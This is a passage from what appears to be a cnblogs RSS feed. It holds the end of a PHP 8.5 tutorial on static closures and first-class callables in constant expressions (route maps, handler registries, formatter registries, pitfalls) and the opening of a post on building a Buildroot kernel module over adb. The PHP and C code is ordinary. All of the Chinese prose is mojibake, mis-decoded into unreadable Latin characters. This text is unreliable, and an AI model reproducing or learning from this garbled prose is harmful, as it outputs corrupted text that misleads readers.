<li>å¿é¡»æ¯éæçï¼æ²¡æ <code>$this</code>ï¼ã</li>
<li>ä¸è½éè¿ <code>use(...)</code> æè·å¤é¨åéã</li>
<li>ç®­å¤´å½æ°å¨å¸¸éè¡¨è¾¾å¼ä¸­ä¸æ¯æï¼å ä¸ºå®ä»¬éå¼æè·åéã</li>
</ul>
<p>è¿äºè§åæ¯ç¼è¯æ¶å¼ºå¶çã</p>
<p>è¿å¬èµ·æ¥æéå¶ï¼ä½å®éä¸è¿æ­£æ¯è¿ä¸ªç¹æ§å®å¨çåå ï¼å®é²æ­¢æå¤æ"è¿è¡æ¶ç¶æ"å·æ¸¡è¿å¸¸éã</p>
<h3 id="é»è®¤åè°åæ°ä¸éè¦å¯ç©ºæ ·æ¿">é»è®¤åè°åæ°ï¼ä¸éè¦å¯ç©ºæ ·æ¿</h3>
<p>è¿æ¯ä¹åè¿æ»¤å¨ç¤ºä¾çå¹²å PHP 8.5 çæ¬ï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

function my_filter(
    array $items,
    Closure $predicate = static function ($v): bool { return !empty($v); },
): array {
    $out = [];
    foreach ($items as $item) {
        if ($predicate($item)) {
            $out[] = $item;
        }
    }
    return $out;
}
</code></pre>
<p>è¿æ­£æ¯é­å RFC å¼ºè°çå¨æºï¼ä½ å¯ä»¥å£°æä¸ä¸ªçæ­£çé»è®¤åè°ï¼ä¸éè¦"å¯ç©º + è¿è¡æ¶é»è®¤"ã</p>
<p>å®éä¸ï¼è¿ä¹æ¹åäºå·¥å·æ¯æï¼</p>
<ul>
<li>åæ°æ­£ç¡®å°ç±»ååä¸º <code>Closure</code>ï¼ä¸æ¯ <code>?Closure</code></li>
<li>è°ç¨èä¸éè¦çæµ <code>null</code> æ¯å¦æç¹æ®å«ä¹</li>
<li>ä½ å»æäºä¸ä¸ªåæ¯åä¸è¡åå§ååªé³</li>
</ul>
<h3 id="åå«å¯è°ç¨è¡ä¸ºçç±»å¸¸é">åå«å¯è°ç¨è¡ä¸ºçç±»å¸¸é</h3>
<p>ä½ å¯ä»¥å¨å¸¸éæç±»å¸¸éä¸­å­å¨é­åï¼æå®ä»¬å½ä½"å¯è°ç¨éç½®"ã</p>
<p>ä¸ä¸ªç®åä¾å­ï¼æ ¼å¼åå¨æ³¨åè¡¨ã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Formatters
{
    public const MAP = [
        'trim_lower' =&gt; static function (string $s): string {
            return strtolower(trim($s));
        },
        'digits_only' =&gt; static function (string $s): string {
            return preg_replace('/\D+/', '', $s) ?? '';
        },
    ];
}
</code></pre>
<p>ä½¿ç¨ï¼</p>
<pre><code class="language-php">$input = "  +62 (812) 345-678  ";
$normalized = (Formatters::MAP['digits_only'])($input);
</code></pre>
<p>è¿è¯»èµ·æ¥åéç½®ï¼ä½ä¸æ¯"å­ç¬¦ä¸²ç±»å"ãå®æ¯çæ­£ç PHPï¼ç¼è¯è¿çï¼æç±»åçï¼å¯éæçã</p>
<h3 id="å±æ§é»è®¤å¼å¯è°ç¨è¡ä¸ºä½ä¸ºé»è®¤ç­ç¥">å±æ§é»è®¤å¼ï¼å¯è°ç¨è¡ä¸ºä½ä¸ºé»è®¤ç­ç¥</h3>
<p>å ä¸ºå¸¸éè¡¨è¾¾å¼ä¸­çé­åå¯ä»¥ç¨ä½å±æ§é»è®¤å¼ï¼ä½ å¯ä»¥å¨å±æ§å£°æå¤å®ä¹é»è®¤ç­ç¥ââåæ ·ä¸éè¦è¿è¡æ¶åå§åã</p>
<p>ä¾å­ï¼å¯éç½®çè§èåå¨ã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Normalizer
{
    public Closure $normalize = static function (string $s): string {
        return trim($s);
    };

    public function run(string $value): string
    {
        return ($this-&gt;normalize)($value);
    }
}
</code></pre>
<p><strong>éè¦ç»è</strong>ï¼å¸¸éè¡¨è¾¾å¼ä¸­çé­åå¿é¡»æ¯éæçï¼è¿æå³çé­åæ¬èº«ä¸è½ç¨ <code>$this</code>ã</p>
<p>è¿æ¯ææçæè¡¡ï¼å¸¸éè¡¨è¾¾å¼åªæ±å¼ä¸æ¬¡ï¼è <code>$this</code> åªæå¨é­åä¸ºæ¯ä¸ªå¯¹è±¡å®ä¾éæ°åå»ºæ¶æææä¹ï¼è¿ä¸æ¯å¸¸éè¡¨è¾¾å¼çè¡ä¸ºæ¹å¼ï¼ã</p>
<h3 id="ä½ç¨åé­åå¨æ­£ç¡®çä¸ä¸æä¸­ä»ç¶è½çå°ç§ææå">ä½ç¨åï¼é­åå¨æ­£ç¡®çä¸ä¸æä¸­ä»ç¶è½çå°ç§ææå</h3>
<p>å°½ç®¡é­åå¿é¡»æ¯éæçï¼æ²¡æ <code>$this</code>ï¼ï¼å¨è¿äºå¸¸éä¸ä¸æä¸­åå»ºçé­åä»ç¶éµå¾ªæ­£å¸¸çä½ç¨åè§åãRFC è¯´æï¼</p>
<ul>
<li>å±æ§é»è®¤å¼ä¸­çé­åå¯ä»¥è®¿é®æå¨ç±»çç§æå±æ§/æ¹æ³/å¸¸é</li>
<li>å±æ§åæ°ä¸­çé­åå¯ä»¥è®¿é®æå¨ç±»çç§ææå</li>
</ul>
<p>è¿å¯ç¨äºä¸ä¸ªå¥½æ¨¡å¼ï¼æå¤æé»è¾æ¾å¨ç§æéæè¾å©æ¹æ³ä¸­ï¼æé­åä½ä¸ºéç½®æ´é²åºæ¥ã</p>
<h2 id="å¸¸éä¸­çä¸ç­å¯è°ç¨å¯¹è±¡éæå®å¨çå¼ç¨ä¸ç¨å­ç¬¦ä¸²">å¸¸éä¸­çä¸ç­å¯è°ç¨å¯¹è±¡ï¼éæå®å¨çå¼ç¨ï¼ä¸ç¨å­ç¬¦ä¸²</h2>
<p>é­åéå"åèé»è¾"ãä½ææ¶åä½ ä¸æ³è¦åèé»è¾ââä½ æ³æåä¸ä¸ªç°æçå½æ°æéææ¹æ³ã</p>
<p>è¿å°±æ¯ä¸ç­å¯è°ç¨å¯¹è±¡ï¼FCCï¼çç¨æ­¦ä¹å°ã</p>
<p>ä¸ç­å¯è°ç¨å¯¹è±¡çèµ·æ¥åï¼</p>
<pre><code class="language-php">strrev(...)
MyClass::myMethod(...)
</code></pre>
<p>å®ä»¬äº§çä¸ä¸ªè½¬åå°å½æ°/æ¹æ³ç <code>Closure</code>ã</p>
<p>PHP 8.5 ç°å¨åè®¸å¸¸éè¡¨è¾¾å¼ä¸­ç FCC è¯­æ³ï¼æ¨å¨"å®å"å¸¸éä¸­é­åçç¹æ§ã</p>
<h3 id="ä¸ºä»ä¹-fcc-æ¯å­ç¬¦ä¸²å¯è°ç¨æ´å¥½">ä¸ºä»ä¹ FCC æ¯å­ç¬¦ä¸²å¯è°ç¨æ´å¥½</h3>
<p>æ¯è¾è¿ä¸¤ä¸ªï¼</p>
<pre><code class="language-php">// æ§æ¹å¼
public const HANDLERS = [
    'reverse' =&gt; 'strrev',
    'slug' =&gt; 'App\\Slugger::slugify',
];
</code></pre>
<p>å¯¹æ¯ï¼</p>
<pre><code class="language-php">// PHP 8.5
public const HANDLERS = [
    'reverse' =&gt; strrev(...),
    'slug' =&gt; Slugger::slugify(...),
];
</code></pre>
<p>ç¬¬äºä¸ªçæ¬æ´å¥½ï¼å ä¸ºï¼</p>
<ul>
<li>å¯éæï¼éå½ååç§»å¨æ´å¯é </li>
<li>éæåæå¯ä»¥çè§£å®æ¯å¯è°ç¨ç</li>
<li>ä½ é¿åäºé­æ¯å­ç¬¦ä¸²åè¿è¡æ¶å¯è°ç¨è§£æ</li>
</ul>
<h3 id="å¸¸éè¡¨è¾¾å¼ä¸­-fcc-ççº¦æ">å¸¸éè¡¨è¾¾å¼ä¸­ FCC ççº¦æ</h3>
<p>FCC RFC æ·»å äºä¸äºéè¦éå¶ï¼é¤äºæ­£å¸¸ç FCC è§åï¼ï¼</p>
<ul>
<li>åªæ¯æç¬ç«å½æ°åéææ¹æ³ï¼<code>::</code>ï¼ã</li>
<li>åªæ¯æ <code>function_name(...)</code> å <code>ClassName::methodName(...)</code> è¯­æ³ã</li>
<li>ä½ ä¸è½ç¨è¡¨è¾¾å¼æå»ºåç§°ï¼<code>($fn)(...)</code>ï¼ãæ°ç»ï¼<code>[ClassName::class, 'method'](...)</code>ï¼ï¼æä¾èµ <code>__callStatic()</code> é­æ¯æ¹æ³ã</li>
</ul>
<p>è¿æ¯å¥½äºï¼å®è®©å¸¸éè¡¨è¾¾å¼ä¸­ç FCC ç¨æ³æ¸æ°ä¸å¯åæã</p>
<h2 id="å®éç¨ä¾">å®éç¨ä¾</h2>
<h3 id="ç¨ä¾è·¯ç±æ å°ä½ä¸ºå¸¸é">ç¨ä¾ï¼è·¯ç±æ å°ä½ä¸ºå¸¸é</h3>
<p>ä¼ ç»æ¹å¼ï¼è·¯ç±æ å°æ¯è¿è¡æ¶æå»ºçï¼</p>
<pre><code class="language-php">$routes = [
    'GET /health' =&gt; [HealthController::class, 'check'],
    'GET /posts'  =&gt; [PostsController::class, 'index'],
];
</code></pre>
<p>è¿è½ç¨ï¼ä½ä¸æ¯éæå®å¨çã</p>
<p>å¨ PHP 8.5 ä¸­ä½ å¯ä»¥ç¨ FCC æéæé­åå®ä¹è·¯ç±æ å°ï¼ä½ä¸ºå¸¸éï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Routes
{
    public const MAP = [
        'GET /health' =&gt; HealthController::check(...),
        'GET /posts'  =&gt; PostsController::index(...),
        // å¿«éç«¯ç¹çåèå¤çå¨
        'GET /version' =&gt; static function (Request $req): Response {
            return Response::text('ok');
        },
    ];
}
</code></pre>
<p>ç°å¨ä½ å¯ä»¥å®ç°ä¸ä¸ªç®åçååå¨ï¼</p>
<pre><code class="language-php">final class Dispatcher
{
    public function dispatch(Request $req): Response
    {
        $key = $req-&gt;method . ' ' . $req-&gt;path;
        $handler = Routes::MAP[$key] ?? null;
        if ($handler === null) {
            return Response::text('Not found', 404);
        }
        return $handler($req);
    }
}
</code></pre>
<p>è¿ä¸ªæ¨¡å¼æå ä¸ªå¥½å¤ï¼</p>
<ul>
<li>è·¯ç±æ å°æ¯çæ­£çå¸¸ééç½®ã</li>
<li>å¤çå¨æ¯çæ­£çå¯è°ç¨å¯¹è±¡ï¼ä¸æ¯å­ç¬¦ä¸²ã</li>
<li>éææ´å®å¨ï¼ç¹å«æ¯éææ¹æ³å¤çå¨ï¼ã</li>
</ul>
<p>å®éçè·¯ç±å¨éè¦è·¯å¾åæ°ï¼ä½å³ä½¿è¿æ ·ï¼"å¤çå¨æ³¨åè¡¨"é¨åéå¸¸ä¿æéæã</p>
<h3 id="ç¨ä¾æ¶æ¯æ»çº¿çå¤çå¨æ³¨åè¡¨">ç¨ä¾ï¼æ¶æ¯æ»çº¿çå¤çå¨æ³¨åè¡¨</h3>
<p>æ³è±¡ä¸ä¸ªç®åçæ¶æ¯æ»çº¿ï¼æ¶æ¯ç±»æ å°å°å¤çå¨ã</p>
<p>æ§æ¹å¼ï¼</p>
<pre><code class="language-php">$handlers = [
    UserRegistered::class =&gt; 'App\\Handlers\\SendWelcomeEmail::handle',
];
</code></pre>
<p>ç°å¨ï¼ç¨ PHP 8.5 FCCï¼</p>
<pre><code class="language-php">final class MessageHandlers
{
    public const MAP = [
        UserRegistered::class =&gt; SendWelcomeEmail::handle(...),
        OrderPaid::class      =&gt; CreateInvoice::handle(...),
    ];
}
</code></pre>
<p>ååå¨ï¼</p>
<pre><code class="language-php">final class Bus
{
    public function __construct(private Container $container) {}

    public function handle(object $message): void
    {
        $handler = MessageHandlers::MAP[$message::class] ?? null;
        if ($handler === null) {
            throw new RuntimeException('No handler registered for ' . $message::class);
        }
        // å¦æå¤çå¨æ¯éæçï¼å®ä»¬å¯ä»¥æ¾å¼æ¥åä¾èµï¼
        // æèä½ å¯ä»¥è°æ´è¿ä¸ªæ¨¡å¼ï¼è§ä¸é¢ç DI è¯´æï¼ã
        $handler($message, $this-&gt;container);
    }
}
</code></pre>
<p>å³é®æ¦å¿µï¼å¸¸éè¡¨è¾¾å¼è®©ä½ ææ å°ä¿æå¨å¸¸éä¸­ï¼ä½ä½ ä»ç¶æ§å¶ä¾èµå¦ä½æ³¨å¥ââéè¿ç­¾åè®¾è®¡ã</p>
<h3 id="ç¨ä¾ç­ç¥æ ¼å¼åå¨æ³¨åè¡¨switch-è¯­å¥çå¹²åæ¿ä»£">ç¨ä¾ï¼ç­ç¥/æ ¼å¼åå¨æ³¨åè¡¨ï¼switch è¯­å¥çå¹²åæ¿ä»£ï¼</h3>
<p>è¿æ¯ææåæ¬¢çå®éç¨éï¼æ¿æ¢ä¸ä¸ªä¸æ­å¢é¿ç switchã</p>
<pre><code class="language-php">function format(string $type, mixed $value): string
{
    return match ($type) {
        'json' =&gt; json_encode($value),
        'text' =&gt; (string) $value,
        'upper' =&gt; strtoupper((string) $value),
        default =&gt; throw new InvalidArgumentException('Unknown formatter'),
    };
}
</code></pre>
<p>ç°å¨æ³è±¡è¿å¢é¿å° 15-30 ä¸ªç­ç¥ãä½ æç»å¾å°ä¸ä¸ªå¤§ match åä¸ä¸ª diff ç£éã</p>
<p>ç¨å¯è°ç¨å¸¸éï¼</p>
<pre><code class="language-php">final class FormatterRegistry
{
    public const FORMATTERS = [
        'json' =&gt; static function (mixed $v): string {
            return json_encode($v, JSON_THROW_ON_ERROR);
        },
        'text' =&gt; static function (mixed $v): string {
            return (string) $v;
        },
        // FCC å°åçå½æ°
        'reverse' =&gt; strrev(...),
    ];

    public static function format(string $type, mixed $value): string
    {
        $fn = self::FORMATTERS[$type] ?? null;
        if ($fn === null) {
            throw new InvalidArgumentException("Unknown formatter: {$type}");
        }
        return $fn($value);
    }
}
</code></pre>
<p>ç°å¨æ·»å ç­ç¥åªéè¦æ¹ä¸è¡ã</p>
<h2 id="æµè¯åä¾èµæ³¨å¥ä»ä¹è¯¥æ¾å¸¸éä»ä¹è¯¥æ¾å®¹å¨">æµè¯åä¾èµæ³¨å¥ï¼ä»ä¹è¯¥æ¾å¸¸éï¼ä»ä¹è¯¥æ¾å®¹å¨</h2>
<p>è¿ä¸ªç¹æ§å¼å¯¼ä½ èµ°å"ä»£ç å³éç½®"ãè¿å¾å¥½ââç´å°ä½ å¼å§æè¿è¡æ¶ç¶ææ³¨å¥å°åºè¯¥æ¯éæçä¸è¥¿éã</p>
<p>ä¸ä¸ªå¥½çå¿æºæ¨¡åï¼</p>
<ul>
<li><strong>å¸¸éåºè¯¥åå«ç¨³å®çæ¥çº¿</strong>ï¼æ å°ãç­ç¥ãä¸ä¾èµè¿è¡æ¶ç¶æçå°é»è¾çæ®µã</li>
<li><strong>DI å®¹å¨åºè¯¥åå«è¿è¡æ¶ç»è£</strong>ï¼éè¦ç¯å¢ç¸å³æ¥çº¿çå¯¹è±¡ãIO èµæºãå­è¯ãè¿æ¥ç­ã</li>
</ul>
<h3 id="å¥½çå¸¸éå¯è°ç¨ç¨æ³çº¯ç²¹çè½¬æ¢åç­ç¥">å¥½çå¸¸éå¯è°ç¨ç¨æ³ï¼çº¯ç²¹çè½¬æ¢åç­ç¥</h3>
<p>è¿äºå¨å¸¸éè¡¨è¾¾å¼ä¸­æ¯å®å¨çï¼</p>
<ul>
<li>è§èåå½æ°ï¼trimãcanonicalizeï¼</li>
<li>è·¯ç±/ååéæ©é»è¾</li>
<li>åªä¾èµè¾å¥å¼çéªè¯å¨</li>
<li>æ ¼å¼åå¨åæ å°å¨</li>
</ul>
<h3 id="di-çç¨æ­¦ä¹å°å½ä½ éè¦ä¾èµæ¶">DI çç¨æ­¦ä¹å°ï¼å½ä½ éè¦ä¾èµæ¶</h3>
<p>ä½ ä»ç¶å¯ä»¥éè¿è®¾è®¡å¯è°ç¨å¯¹è±¡æ¾å¼æ¥åä¾èµæ¥æ··åå¯è°ç¨éç½®å DIã</p>
<p>ä¾å­ï¼æ³¨åè¡¨è¿åä¸ä¸ªæ¥å <code>(Message $m, Container $c)</code> çå¯è°ç¨å¯¹è±¡ï¼</p>
<pre><code class="language-php">final class Handlers
{
    public const MAP = [
        UserRegistered::class =&gt; static function (UserRegistered $m, Container $c): void {
            $mailer = $c-&gt;get(Mailer::class);
            $mailer-&gt;sendWelcome($m-&gt;email);
        },
    ];
}
</code></pre>
<p>è¿ä¿æå¨çº¦æåï¼å ä¸ºé­åæ¯éæçä¸ä¸æè·ç¶æã"ä¾èµè§£æ"å¨è°ç¨æ¶åçï¼å®¹å¨è¢«ä¼ å¥ã</p>
<p>è¿æ»æ¯çæ³çåï¼ä¸æ¯ãä½å®æ¯ä¸ä¸ªå¹²åãæ¾å¼çæ¡¥æ¢ã</p>
<h3 id="æµè¯å½±åæ´å¥½çé»è®¤å¼æ´å®¹æè¦ç">æµè¯å½±åï¼æ´å¥½çé»è®¤å¼ï¼æ´å®¹æè¦ç</h3>
<p>å¸¸éè¡¨è¾¾å¼é­åè®©é»è®¤å¼æ´å¹²åï¼</p>
<ul>
<li>å½æ°å¯ä»¥æé»è®¤é­ååæ°ï¼ä¸ç¨å¯ç©ºï¼ã</li>
<li>å±æ§å¯ä»¥æé»è®¤é­åç­ç¥ã</li>
</ul>
<p>å¯¹äºæµè¯ï¼ä½ ä»ç¶å¯ä»¥éè¿ä¼ éä¸åçé­ååæ°æç»å¯¹è±¡å±æ§èµå¼ä¸åçç­ç¥æ¥è¦çè¡ä¸ºï¼å¦æè¯¥å±æ§è®¾è®¡ä¸æ¯å¯åçï¼ãä¸»è¦æ¹è¿æ¯é»è®¤è¡ä¸ºå¨å®è¯¥å¨çå°æ¹è¡¨è¾¾ï¼ä½ ä¸éè¦è¿è¡æ¶åå§åè¶æ°´ä»£ç æ¥åå»ºé»è®¤é­åã</p>
<h2 id="é·é±æè·ç¶æå¯ä½ç¨åå¢éå¯è¯»æ§">é·é±ï¼æè·ç¶æãå¯ä½ç¨åå¢éå¯è¯»æ§</h2>
<p>è¿ä¸ªç¹æ§ç»ä½ å¨"éç½®ä¸ä¸æ"ä¸­æ´å¤è½åãè½åå¸¦æ¥æ°çæ¬èµ·ç³å¤´ç ¸èªå·±èçæ¹å¼ã</p>
<h3 id="é·é±-aè¯å¾æè·ç¶æä¸ä¼ç¼è¯è¿æ¯å¥½äº">é·é± Aï¼è¯å¾æè·ç¶æï¼ä¸ä¼ç¼è¯ââè¿æ¯å¥½äºï¼</h3>
<p>ä½ ä¸è½è¿æ ·åï¼</p>
<pre><code class="language-php">$prefix = "prod_";
const FN = static function (string $s) use ($prefix): string {
    return $prefix . $s;
};
</code></pre>
<p>å¸¸éè¡¨è¾¾å¼ä¸­çé­åä¸è½éè¿ <code>use(...)</code> æè·åéã</p>
<p>è¿æ¯ç¡¬æ§çº¦æï¼å®å¼ºè¿«ä½ éç¨æ´å¥½çè®¾è®¡ï¼</p>
<ul>
<li>æå¼ä½ä¸ºåæ°ä¼ é</li>
<li>ä½¿ç¨å¸¸é/ç±»å¸¸é</li>
<li>æèåè¿è¡æ¶éç½®ï¼èä¸æ¯åè£å®æ¯å¸¸é</li>
</ul>
<p>ç±»ä¼¼å°ï¼ç®­å¤´å½æ°å¨å¸¸éè¡¨è¾¾å¼ä¸­è¢«é»æ­¢ï¼å ä¸ºå®ä»¬éå¼æè·åéã</p>
<h3 id="é·é±-bå¨éç½®ééèå¯ä½ç¨">é·é± Bï¼å¨"éç½®"ééèå¯ä½ç¨</h3>
<p>å¦æä½ ç"æ³¨åè¡¨"é­åå¼å§å IOãè®¿é®æ°æ®åºãè¯»åç¯å¢åéç­ï¼ä½ å°±è®©éç½®åå¾ä¸å¯é¢æµäºã</p>
<p>ä¸ä¸ªå¥½è§åï¼</p>
<p>å¦æå¯è°ç¨å¯¹è±¡åçä¸åªæ¯"è®¡ç®å¹¶è¿å"ï¼èèæå®ç§»å°çæ­£çæå¡ä¸­ï¼éè¿éææ¹æ³å¼ç¨å®ï¼æå®¹å¨æ¥çº¿ï¼ã</p>
<h3 id="é·é±-cå¨çº¯æ°æ®æ´æ¸æ°çå°æ¹ç¨å¯è°ç¨éç½®">é·é± Cï¼å¨çº¯æ°æ®æ´æ¸æ°çå°æ¹ç¨å¯è°ç¨éç½®</h3>
<p>ä»ä»å ä¸ºä½ è½å¨å±æ§éæ¾ä»£ç ï¼ä¸æå³çä½ åºè¯¥è¿æ ·åã</p>
<p>å¦æä½ çè§åå¯ä»¥è¡¨è¾¾ä¸ºç®åæ°æ®ââç¨æ°æ®ãä¾å­ï¼</p>
<ul>
<li>åè®¸çè§è²</li>
<li>æ°å­èå´</li>
<li>æä¸¾éå</li>
</ul>
<p>å¯è°ç¨éç½®åºè¯¥æ¯ä½ çå·¥å·ï¼ç¨äºæ°æ®æ¬èº«åå¾ç¬¨æçæåµï¼æèä½ å¦åä¼åæä¸ä¸ªå­ç¬¦ä¸²è¡¨è¾¾å¼ DSLï¼ã</p>
<h3 id="é·é±-då¢éé´çå¯è¯»æ§åä¸è´æ§">é·é± Dï¼å¢éé´çå¯è¯»æ§åä¸è´æ§</h3>
<p>å¯è°ç¨éç½®ä»ç¶æ¯ä»£ç ãå¦æä½ çå¢éç»éªæ°´å¹³ä¸ä¸ï¼ä½ éè¦çº¦å®ï¼</p>
<ul>
<li>ä¿æå¸¸éè¡¨è¾¾å¼é­åç®ç­ã</li>
<li>å½é­åè¶è¿çº¦ 10 è¡æ¶ï¼å¾åäºå½åé»è¾å¹¶éè¿ FCC å¼ç¨å®ï¼<code>SomeClass::somePolicy(...)</code>ï¼ã</li>
<li>é¿åè±å¨åæ³ï¼ç¹å«æ¯åµå¥å¿åå½æ°ï¼ã</li>
</ul>
<h2 id="æåä»ä¹æ¶åéç½®åºè¯¥ä¿ææ°æ®ä»ä¹æ¶åå¯è°ç¨éç½®æ¯åçç">æåï¼ä»ä¹æ¶åéç½®åºè¯¥ä¿æ"æ°æ®"ï¼ä»ä¹æ¶å"å¯è°ç¨éç½®"æ¯åçç</h2>
<p>è¿æ¯ä¸å¥å¨å®éä»£ç åºä¸­éå¸¸ææä¸éçå®ç¨æåã</p>
<p><strong>å¨ä»¥ä¸æåµå¾åäºçº¯æ°æ®éç½®ï¼</strong></p>
<ul>
<li>è§åæ¯éæä¸å°çï¼æ å¿ãåè¡¨ãéå¼ï¼</li>
<li>ä½ æ³è¦å®¹æåºååï¼æ¯å¦å¯¼åºéç½®ï¼</li>
<li>ä½ æ³è®©éå¼åèå¯ä»¥ç¼è¾éç½®ï¼å¨æäºç»ç»ä¸­ï¼</li>
</ul>
<p>ä¾å­ï¼</p>
<pre><code class="language-php">final class Limits
{
    public const MAX_TITLE_LENGTH = 120;
    public const ALLOWED_SORTS = ['newest', 'popular', 'discussed'];
}
</code></pre>
<p><strong>å¨ä»¥ä¸æåµä½¿ç¨å¯è°ç¨éç½®ï¼</strong></p>
<ul>
<li>è§åç®åä½ä¸è½å¾å¥½å°æ å°å°æ°æ®ï¼æ¯å¦è°è¯ï¼</li>
<li>ä½¿ç¨æ°æ®ä¼æä½ æ¨åèªå®ä¹ DSL</li>
<li>ä½ æ³éè¿å±æ§è®©éç½®é è¿ç±»/æ¹æ³</li>
<li>ä½ æ³è¦éæå®å¨çå¯è°ç¨å¯¹è±¡èä¸æ¯å­ç¬¦ä¸²</li>
</ul>
<p>è¿æ­£æ¯ PHP 8.5 å¨å±æ§ãé»è®¤å¼åå¸¸éä¸­å¯ç¨çã</p>
<p><strong>ä¿æå¯è°ç¨éç½®å®å¨ä¸å¯ç»´æ¤ï¼</strong></p>
<ul>
<li>è®©é­åéæï¼åæ­£æ¯å¿é¡»çï¼ã</li>
<li>ä¸è¦è¯å¾æè·å¤é¨åéï¼<code>use(...)</code> ä¸åè®¸ï¼ã</li>
<li>å½é»è¾å¢é¿æ¶ï¼æå®ç§»å°å½åçéææ¹æ³å¹¶ç¨ FCC å¼ç¨å®ï¼PHP 8.5 ç°å¨å¨å¸¸éè¡¨è¾¾å¼ä¸­åè®¸è¿æ ·åã</li>
<li>åªå¨æ¯æçå½¢å¼ä¸­ä½¿ç¨ FCCï¼<code>function_name(...)</code> å <code>ClassName::methodName(...)</code>ï¼ä¸æ¯ææ°ç»å¯è°ç¨è¯­æ³ï¼ã</li>
</ul>
<h3 id="å³äºæ§è½å-opcache-çè¯´æ">å³äºæ§è½å opcache çè¯´æ</h3>
<p>å¦æä½ æ³ç¥éè¿æ¯å¦"åè´¹"ï¼ä¸¤ä¸ª RFC é½æå° opcache éè¦è°æ´æè½æ­£ç¡®å°å¨å±äº«åå­ä¸­å­å¨è¿äºé­å/å¯è°ç¨å¯¹è±¡ã</p>
<p>æ¢å¥è¯è¯´ï¼è¿ä¸ªç¹æ§çå®ç°èèäºçå®ä¸ççè¿è¡æ¶ç¯å¢ï¼opcache/JITï¼ãç®æ ä¸æ¯å¾®ä¼åââèæ¯è¡¨è¾¾ååå®å¨æ§ã</p>
<h2 id="å°ç»">å°ç»</h2>
<p>PHP 8.5 æ¯æå¸¸éè¡¨è¾¾å¼ä¸­çéæé­ååä¸ç­å¯è°ç¨å¯¹è±¡ï¼è¿æ¯é£ç§å¨æ´æ°æ¥å¿ä¸çèµ·æ¥å¾å°ãç¶åæææ¹åä½ è®¾è®¡ API æ¹å¼çç¹æ§ï¼</p>
<ul>
<li>é»è®¤åè°åå¾å¹²åä¸ç±»åæ­£ç¡®ï¼ä¸ç¨å¯ç©ºæ ·æ¿ï¼ã</li>
<li>å±æ§å¯ä»¥æºå¸¦çæ­£çå¯æ§è¡ç­ç¥é»è¾ââä¸ç¨å­ç¬¦ä¸² DSLã</li>
<li>æ³¨åè¡¨åè·¯ç±æ å°å¯ä»¥å®ä¹ä¸ºå¸¸éï¼ä½¿ç¨éæå®å¨çå¯è°ç¨å¯¹è±¡ã</li>
</ul>
<p>çº¦æå°±æ¯æ¤æ ï¼ä¸è½æè·åéãæ²¡æ <code>$this</code>ãå¸¸éè¡¨è¾¾å¼ä¸­æ²¡æç®­å¤´å½æ°ã</p>
<p>å¦æä½ æ¥åè¿äºæ¤æ ï¼ä½ ä¼å¾å°ä¸ä¸ªçæ­£æ´å¥½ç"ç¼è¯æ¶é£æ ¼"éç½®å±ââæ¥çº¿æ¯éæçãå¯è¯»çãéææ´å®å¨ã</p>
<p>ç¨å®æ¥ç§»é¤è¶æ°´ä»£ç ï¼èä¸æ¯éèå¤ææ§ãä¿æå¯è°ç¨éç½®ç®ç­ï¼ç»éçä¸è¥¿å½åï¼è®©ä½ çå¸¸éæè¿°"åçä»ä¹"ï¼èä¸æ¯æå®ä»¬åæè¿·ä½ åºç¨ç¨åºã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-17 08:10">2026-01-17 08:09</span>&nbsp;
<a href="https://www.cnblogs.com/catchadmin">JaguarJack</a>&nbsp;
éè¯»(<span id="post_view_count">44</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19494966);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19494966', targetLink: 'https://www.cnblogs.com/catchadmin/p/19494966', title: 'PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ç¼åä¸ä¸ªBuildroot é©±å¨ ]]></title>
    <link>https://www.cnblogs.com/tianwuyvlianshui/p/19494280</link>
    <guid>b580055d9c8ea13289397c39cb1f8618</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/tianwuyvlianshui/p/19494280" title="åå¸äº 2026-01-16 22:45">
    <span role="heading" aria-level="2">ç¼åä¸ä¸ªBuildroot é©±å¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ç¼åä¸ä¸ªbuildroot-é©±å¨æ¨¡å">ç¼åä¸ä¸ªBuildroot é©±å¨æ¨¡å</h1>
<p>ç±äºBuildroot ä¸æ¯æssh</p>
<p>æéç¨adbè°è¯</p>
<h2 id="adbè¿æ¥">adbè¿æ¥</h2>
<h3 id="ååºè®¾å¤">ååºè®¾å¤</h3>
<pre><code>adb devices
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224244254-2021753310.png" alt="image-20260116202202616" loading="lazy"></p>
<h3 id="è¿æ¥è®¾å¤">è¿æ¥è®¾å¤</h3>
<pre><code>adb shell
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245370-1464333835.png" alt="image-20260116202213317" loading="lazy"></p>
<h2 id="é©±å¨æ¨¡åç¼è¯äº¤åç¼è¯">é©±å¨æ¨¡åç¼è¯(äº¤åç¼è¯)</h2>
<h3 id="é©±å¨æ¨¡åæºç ">é©±å¨æ¨¡åæºç </h3>
<pre><code class="language-c">#include &lt;linux/module.h&gt;     /* æ¨¡åç¸å³å®åå½æ° */
#include &lt;linux/kernel.h&gt;     /* printkæ¥å¿å½æ° */

/* å è½½å½æ°ï¼é©±å¨å¥å£ï¼ï¼å½é©±å¨è¢« insmod å è½½æ¶èªå¨æ§è¡ */
static int __init helloworld_init(void)
{
    printk("helloworld_init\r\n"); // åæ ¸æ¥å¿æå°
    return 0; // è¿å0ä»£è¡¨å è½½æå
}

